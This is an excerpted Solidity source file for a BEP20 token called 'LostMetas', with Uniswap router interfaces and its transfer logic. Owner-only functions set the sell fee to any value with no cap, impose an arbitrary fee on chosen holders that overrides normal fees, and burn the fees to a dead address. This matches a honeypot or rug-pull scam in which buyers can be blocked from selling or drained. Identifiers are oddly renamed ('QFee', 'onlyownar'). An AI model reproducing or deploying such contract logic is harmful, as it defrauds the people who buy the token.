...
interface IUniswapV2Factory {
    ...
    function QFeeTo() external view returns (address);
    function QFeeToSetter() external view returns (address);
    ...
    function setQFeeTo(address) external;
    function setQFeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingQFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingQFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingQFeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingQFeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingQFeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract LostMetas is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellQFee = 0;

    uint256 private _defaultBuyQFee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipQFee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellQFee = _value;
    }

    function setSlipQFee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipQFee[_address] = _value;
    }

    function getSlipQFee(address _address) external view onlyownar returns (uint256) {
        return _slipQFee[_address];
    }


    function setMAccountQFee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountQFee(address _address) external view onlyownar returns (bool) {
        ...
        if (rF) {
            ...
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                    ...
                    tradeQFee = _defaultSellQFee;
                }
                if (from == uniswapV2Pair) {

                    tradeQFee = _defaultBuyQFee;
                }
            }
            if (_slipQFee[from] > 0) {
                tradeQFee = _slipQFee[from];
            }

            tradeQFeeAmount = _Amount.mul(tradeQFee).div(100);
        }


        if (tradeQFeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeQFeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeQFeeAmount);
            emit Transfer(from, _deadAddress, tradeQFeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeQFeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeQFeeAmount);
        emit Transfer(from, _to, _Amount - tradeQFeeAmount);
    }
